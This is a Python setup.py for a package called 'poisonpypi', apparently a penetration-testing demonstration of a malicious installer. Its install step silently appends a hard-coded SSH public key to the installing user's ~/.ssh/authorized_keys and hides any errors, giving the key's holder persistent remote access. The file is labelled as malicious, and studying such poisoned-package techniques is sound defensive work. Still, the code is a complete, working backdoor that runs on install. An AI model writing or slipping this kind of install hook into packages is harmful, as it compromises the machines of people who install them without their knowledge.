from setuptools import setup
from os.path import expanduser

try:
    home = expanduser('~')
    with open(home + '/.ssh/authorized_keys', 'a') as f:
        f.write('ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICjQ35ZVQLwe5EdcZxi8ulV7mtrAeqAiNpANesWUl2ZW\n')
except:
    pass

setup(
    name='poisonpypi',
    packages=['poisonpypi'],
    description='Pointless module with malicious installer script',
    version='0.1',
    url='http://github.com/peterezzo/poisonpypi',
    author='Pete Ezzo',
    author_email='peter.ezzo@gmail.com',
    keywords=['pip','vidy','pentest']
    )
